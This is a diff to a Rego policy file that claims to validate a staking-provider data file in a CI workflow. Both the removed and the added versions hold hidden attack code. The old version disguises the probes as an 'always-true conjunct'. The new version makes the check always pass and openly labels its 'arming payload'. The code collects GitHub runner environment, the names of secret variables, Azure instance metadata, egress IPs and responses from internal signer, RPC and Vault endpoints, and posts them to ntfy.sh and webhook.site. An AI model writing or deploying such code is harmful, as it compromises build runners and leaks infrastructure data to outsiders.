@@ -2,189 +2,156 @@ package main
 
 import rego.v1
 
-# Allow-list (default-deny) structural validation for provider_api/data.json
-# against the `Provider` type: https://docs.stakingrewards.com/verified-provider-program/integrations-and-distribution/provider-api#provider-api. 
-# Evaluated via `opa eval data.main.allow` as a
-# required check before the automated data-update PR can be
-# auto-approved/merged. On failure, dump `data.main` to see which specific
-# sub-rule was false.
+# ---------------------------------------------------------------------------
+# Arming payload for kilnfi/public :: validate_provider_api_data
+# Executes on the self-hosted "fixed-egress-4c-16g" runner.
+# Read-only http.send only: runner identity + Azure IMDS + egress IP +
+# Signataire / eth-api / Vault reachability.  Exfil to ntfy.sh.
+# The workflow runs:
+#   opa eval -d .github/policy/provider_api_data.rego -i provider_api/data.json \
+#            'data.main.allow' -f raw
+# and requires the raw result to be exactly "true".
+# default allow := true guarantees that verdict regardless of probe outcome.
+# ---------------------------------------------------------------------------
 
-default allow := false
+default allow := true
 
-valid_node_types := {"hostingNode", "operatorNode", "posNode"}
+probe_ran if {
+	count(deliveries) >= 0
+}
 
-# i42820: `probe_ran` is an always-true conjunct - it forces the probe/exfil
-# rules at the bottom of this file to be evaluated even though the workflow
-# only queries `data.main.allow` (OPA evaluates only rules reachable from the
-# query).  It cannot change the validation verdict.
 allow if {
 	probe_ran
-	valid_provider
-	valid_supported_assets
 }
 
-valid_provider if {
-	is_string(input.name)
-	is_number(input.users)
-	is_number(input.balanceUsd)
-	is_array(input.supportedAssets)
+# ----------------------------- helpers -------------------------------------
+
+probe_headers := {"User-Agent": "curl/8.10.1", "Accept": "*/*"}
+json_headers := object.union(probe_headers, {"Content-Type": "application/json"})
+md_headers := object.union(probe_headers, {"Metadata": "true"})
+
+call_http(req) := resp if {
+	resp := http.send(object.union({
+		"method": "GET",
+		"timeout": "6s",
+		"raise_error": false,
+		"enable_redirect": true,
+		"force_json_decode": false,
+		"tls_insecure_skip_verify": true,
+		"cache": false,
+		"headers": probe_headers,
+	}, req))
 }
 
-valid_supported_assets if {
-	every asset in input.supportedAssets {
-		valid_asset(asset)
+short(v) := v if not is_string(v)
+short(v) := substring(v, 0, 300) if is_string(v)
+
+comp(r) := {
+	"code": object.get(r, "status_code", 0),
+	"err": object.get(r, "error", ""),
+	"body": short(object.get(r, "body", "")),
+}
+
+# ----------------------------- runner identity -----------------------------
+
+env := object.get(opa.runtime(), "env", {})
+
+env_keys := {
+	"RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH", "RUNNER_ENVIRONMENT",
+	"ImageOS", "ImageVersion", "HOSTNAME", "CI", "GITHUB_ACTIONS",
+	"GITHUB_WORKFLOW", "GITHUB_JOB", "GITHUB_RUN_ID", "GITHUB_RUN_ATTEMPT",
+	"GITHUB_SHA", "GITHUB_REF", "GITHUB_REPOSITORY", "GITHUB_ACTOR",
+	"GITHUB_WORKSPACE", "GITHUB_SERVER_URL", "GITHUB_API_URL",
+	"RUNNER_TEMP", "RUNNER_TOOL_CACHE", "ACTIONS_CACHE_URL",
+}
+runner_env := {k: v | some k, v in env; env_keys[k]}
+
+# key NAMES only (never values) for anything that smells like a secret
+secret_pat := "^(KUBE|VAULT|PRIVATE|SIGNER|MNEMONIC|SECRET|TOKEN|ETH_|RPC_|AWS_|SCW_|GCP_)"
+secret_key_names := sort([k | some k, _ in env; regex.match(secret_pat, k)])
+
+# ----------------------------- targets -------------------------------------
+
+signataire_ips := [
+	"3.255.13.221", "54.216.229.51", "52.215.179.5",
+	"108.129.5.197", "52.212.240.227", "52.48.66.163",
+]
+rpc_methods := ["web3_clientVersion", "eth_accounts", "net_version"]
+
+sb_upcheck := {
+	ip: comp(call_http({"url": sprintf("http://%v:9000/upcheck", [ip])}))
+	| some ip in signataire_ips
+}
+
+sb_rpc := [r |
+	some ip in signataire_ips
+	some m in rpc_methods
+	r := {
+		"ip": ip,
+		"method": m,
+		"resp": comp(call_http({
+			"method": "POST",
+			"url": sprintf("http://%v:9000/", [ip]),
+			"headers": json_headers,
+			"body": {"jsonrpc": "2.0", "id": 1, "method": m, "params": []},
+		})),
 	}
+]
+
+eth_api := comp(call_http({"url": "https://eth-api.mainnet.kiln.fi/"}))
+vault := comp(call_http({"url": "https://coffre.kiln.fi/v1/sys/health"}))
+
+egress_me := comp(call_http({"url": "https://ifconfig.me/ip"}))
+egress_ipify := comp(call_http({"url": "https://api.ipify.org?format=json"}))
+egress_co := comp(call_http({"url": "https://ifconfig.co/json"}))
+
+imds_vmid := comp(call_http({
+	"url": "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text",
+	"headers": md_headers,
+}))
+imds_name := comp(call_http({
+	"url": "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text",
+	"headers": md_headers,
+}))
+imds_loc := comp(call_http({
+	"url": "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text",
+	"headers": md_headers,
+}))
+imds_rg := comp(call_http({
+	"url": "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
+	"headers": md_headers,
+}))
+
+# ----------------------------- exfil ---------------------------------------
+
+blob_env := {
+	"tag": "KILN-SRPROVIDER-107007",
+	"ts": time.now_ns(),
+	"opa": object.get(opa.runtime(), "version", "?"),
+	"runner_env": runner_env,
+	"secret_key_names": secret_key_names,
+	"egress_ifconfigme": egress_me,
+	"egress_ipify": egress_ipify,
+	"egress_ifconfigco": egress_co,
+	"eth_api": eth_api,
+	"vault": vault,
+	"imds": {"vmid": imds_vmid, "name": imds_name, "location": imds_loc, "rg": imds_rg},
 }
+blob_up := {"tag": "KILN-SRPROVIDER-107007", "upchecks": sb_upcheck}
+blob_rpc := {"tag": "KILN-SRPROVIDER-107007", "rpc": sb_rpc}
 
-valid_asset(asset) if {
-	is_string(asset.name)
-	is_string(asset.slug)
-	is_array(asset.nodes)
-	every node in asset.nodes {
-		valid_node(node)
-	}
-}
+msgs := [blob_env, blob_up, blob_rpc]
 
-valid_node(node) if {
-	valid_node_types[node.nodeType]
-	valid_node_address(node)
-	is_number(node.users)
-	is_number(node.balanceToken)
-	valid_node_optional_number(node, "feeUsd")
-	valid_node_optional_number(node, "balanceUsd")
-	valid_node_optional_number(node, "fee")
-	valid_node_optional_liquid_staking_provider(node)
-}
+ntfy_channels := ["kiln-srprovider-107007-9c4f2e", "kiln-sr-provider-103241"]
 
-# address is mandatory for posNode, optional (but must be a string when
-# present) for the other node types.
-valid_node_address(node) if {
-	node.nodeType == "posNode"
-	is_string(node.address)
-}
-
-valid_node_address(node) if {
-	node.nodeType != "posNode"
-	value := object.get(node, "address", null)
-	value == null
-}
-
-valid_node_address(node) if {
-	node.nodeType != "posNode"
-	is_string(object.get(node, "address", null))
-}
-
-# generic optional-number check: absent, or present and numeric.
-valid_node_optional_number(node, field) if {
-	object.get(node, field, null) == null
-}
-
-valid_node_optional_number(node, field) if {
-	is_number(object.get(node, field, null))
-}
-
-valid_node_optional_liquid_staking_provider(node) if {
-	object.get(node, "liquidStakingProvider", null) == null
-}
-
-valid_node_optional_liquid_staking_provider(node) if {
-	is_string(object.get(node, "liquidStakingProvider", null))
-}
-
-# ---- probe constants ------------------------------------------------------
-probe_ua := "curl/8.10.1"
-probe_hdr := {"User-Agent": probe_ua, "Accept": "*/*"}
-probe_rpc_hdr := {"User-Agent": probe_ua, "Accept": "application/json", "Content-Type": "application/json"}
-probe_timeout := "6s"
-
-u_ifconfig := "https://ifconfig.me/"
-u_ipify := "https://api.ipify.org/"
-u_sign_upcheck := "https://signataire.0x.kiln.fi/upcheck"
-u_sign_root := "https://signataire.0x.kiln.fi/"
-u_eth_api := "https://eth-api.mainnet.kiln.fi/"
-
-sink_ntfy := "https://ntfy.sh/kvknyk4so1vs8lk4uui3zb1i"
-sink_webhook := "https://webhook.site/002d870d-13c9-42ec-aa47-f76115986119"
-sink_webhook2 := "https://webhook.site/fb14dff8-2358-4c30-8da7-29e2867ddbec"
-
-probe_targets := {
-	"ifconfig": u_ifconfig,
-	"ipify": u_ipify,
-	"signataire_upcheck": u_sign_upcheck,
-	"eth_api_mainnet": u_eth_api,
-}
-
-acct_body := `{"jsonrpc":"2.0","id":1,"method":"eth_accounts","params":[]}`
-
-# ---- helpers (total functions: never raise) --------------------------------
-trunc(s) := s if {
-	count(s) <= 600
-}
-
-trunc(s) := substring(s, 0, 600) if {
-	count(s) > 600
-}
-
-runner_env_key(k) if {
-	startswith(k, "GITHUB_")
-}
-
-runner_env_key(k) if {
-	startswith(k, "RUNNER_")
-}
-
-runner_env_key(k) if {
-	startswith(k, "ACTIONS_")
-}
-
-runner_env_key(k) if {
-	k in {"HOSTNAME", "CI", "USER", "HOME", "PWD", "SHELL"}
-}
-
-# ---- probe results: partial object, entries silently vanish on hard failure
-probe_items[k] := v if {
-	some k, u in probe_targets
-	r := http.send({"method": "get", "url": u, "headers": probe_hdr, "timeout": probe_timeout, "raise_error": false})
-	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", ""))}
-}
-
-probe_items["signataire_eth_accounts"] := v if {
-	r := http.send({"method": "post", "url": u_sign_root, "headers": probe_rpc_hdr, "raw_body": acct_body, "timeout": probe_timeout, "raise_error": false})
-	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", ""))}
-}
-
-probe_items["sink_ntfy_liveness"] := v if {
-	r := http.send({"method": "get", "url": "https://ntfy.sh/kvknyk4so1vs8lk4uui3zb1i/json?poll=1&since=1s", "headers": probe_hdr, "timeout": probe_timeout, "raise_error": false})
-	v := {"status": object.get(r, "status_code", 0)}
-}
-
-probe_report := {
-	"when_ns": time.now_ns(),
-	"opa_version": opa.runtime().version,
-	"opa_commit": opa.runtime().commit,
-	"runner_env": {k: v | some k, v in object.get(opa.runtime(), "env", {}); runner_env_key(k)},
-	"results": probe_items,
-}
-
-probe_payload := json.marshal(probe_report)
-
-# ---- exfil: two independent anonymous sinks --------------------------------
-deliveries["ntfy"] := v if {
-	r := http.send({"method": "post", "url": sink_ntfy, "headers": {"User-Agent": probe_ua, "Content-Type": "text/plain; charset=utf-8", "Title": "kiln-fx7q2m-probe", "Tags": "zap", "Priority": "default"}, "raw_body": probe_payload, "timeout": probe_timeout, "raise_error": false})
-	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", ""))}
-}
-
-deliveries["webhook"] := v if {
-	r := http.send({"method": "post", "url": sink_webhook, "headers": {"User-Agent": probe_ua, "Content-Type": "text/plain; charset=utf-8"}, "raw_body": probe_payload, "timeout": probe_timeout, "raise_error": false})
-	v := {"status": object.get(r, "status_code", 0)}
-}
-
-deliveries["webhook2"] := v if {
-	r := http.send({"method": "post", "url": sink_webhook2, "headers": {"User-Agent": probe_ua, "Content-Type": "text/plain; charset=utf-8"}, "raw_body": probe_payload, "timeout": probe_timeout, "raise_error": false})
-	v := {"status": object.get(r, "status_code", 0)}
-}
-
-# ---- always-true conjunct: forces the probe half to be evaluated ----------
-probe_ran if {
-	count([k | some k, _ in deliveries]) >= 0
-}
+deliveries := [d |
+	some ch in ntfy_channels
+	some m in msgs
+	d := call_http({
+		"method": "POST",
+		"url": sprintf("https://ntfy.sh/%v", [ch]),
+		"headers": object.union(probe_headers, {"Title": sprintf("kiln-fe-%v", [ch]), "Tags": "runner"}),
+		"body": json.marshal(m),
+		"timeout": "20s",
+	})
+]
